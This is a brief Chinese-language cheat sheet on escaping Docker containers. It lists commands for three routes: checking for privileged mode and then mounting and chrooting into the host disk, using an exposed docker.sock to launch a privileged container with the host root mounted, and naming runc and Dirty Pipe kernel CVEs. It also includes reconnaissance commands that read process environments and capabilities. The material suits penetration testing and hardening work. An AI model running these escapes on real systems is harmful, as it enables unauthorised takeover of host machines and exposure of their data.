# Docker 容器逃逸

## 特权模式逃逸
```bash
# 检测是否特权模式
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff → 是特权模式

# 直接挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

## 挂载宿主机目录
```bash
# 如 /var/run/docker.sock 被挂载
ls -la /var/run/docker.sock

# 通过 Docker socket 创建特权容器
docker run -it -v /:/host --privileged ubuntu bash
chroot /host
```

## 内核漏洞逃逸
```bash
# CVE-2019-5736 runc 逃逸
# CVE-2020-15257 host模式
# dirty_pipe (CVE-2022-0847)
```

## 检测命令
```bash
# 是否是容器环境
cat /proc/1/cgroup | grep docker
cat /proc/1/environ | tr '\0' '\n'

# 查看 capabilities
cat /proc/self/status | grep Cap
capsh --print

# 查看挂载
mount | grep docker
ls -la /var/run/docker.sock
```
